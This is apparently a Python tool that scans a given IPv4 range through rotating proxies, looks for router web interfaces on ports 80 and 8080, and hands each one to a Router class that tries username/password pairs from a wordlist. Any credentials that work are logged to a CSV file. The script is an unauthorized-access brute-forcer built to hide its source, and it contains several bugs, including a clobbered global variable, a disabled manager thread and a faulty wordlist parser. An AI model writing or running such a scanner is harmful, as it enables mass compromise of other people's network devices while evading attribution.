import sys
import threading

import requests

from router import Router

threads = []


def threads_manager(max_threads):
    active_threads = 0
    while True:
        for router in threads:
            if router.working is False and active_threads < max_threads:
                router.start()
                active_threads += 1
            if router.finished is True:
                active_threads -= 1
                if router.login is not None:
                    with open('result.csv', 'a') as fd:
                        fd.write(f'{router.address}, {router.login}, {router.password}')
                        fd.close()


def get_ip_range(start_ip, end_ip):
    start = list(map(int, start_ip.split(".")))
    end = list(map(int, end_ip.split(".")))
    temp = start
    ip_range = [start_ip]

    while temp != end:
        start[3] += 1
        for i in (3, 2, 1):
            if temp[i] == 256:
                temp[i] = 0
                temp[i - 1] += 1
            ip_range.append(".".join(map(str, temp)))

    return ip_range


def scan_addresses(proxies, addresses, wordlist):
    i = 0

    for ip_address in addresses:
        proxy_dict = {
            "http": f'http://{proxies[i]}',
            "https": f'https://{proxies[i]}',
        }

        for port in [80, 8080]:
            try:
                response = requests.get(f'http://{ip_address}:{port}', proxies=proxy_dict)
                if response.status_code == 200:
                    router = Router(proxies, ip_address, wordlist, port)
                    threads.append(router)
            except:
                pass
        i += 1

        if i >= len(proxies):
            i = 0


def parse_wordlist(wordlist):
    new_wordlist = []

    for word in wordlist:
        new_wordlist.append({"login": word.split(" ")[0], "password": word.split(" ")[0]})

    return new_wordlist


if __name__ == "__main__":
    threads = int(sys.argv[1])
    proxy_path = str(sys.argv[2])
    wordlist_path = str(sys.argv[3])
    address = str(sys.argv[4])

    proxy_file = open(proxy_path, 'r')
    proxies = proxy_file.readlines()
    wordlist_file = open(wordlist_path, 'r')
    wordlist = wordlist_file.readlines()
    wordlist = parse_wordlist(wordlist)
    addresses = get_ip_range(address.split("-")[0], address.split("-")[1])

    thread = threading.Thread(target=threads_manager, args=(threads,))
    # thread.start()
    scan_addresses(proxies, addresses, wordlist)
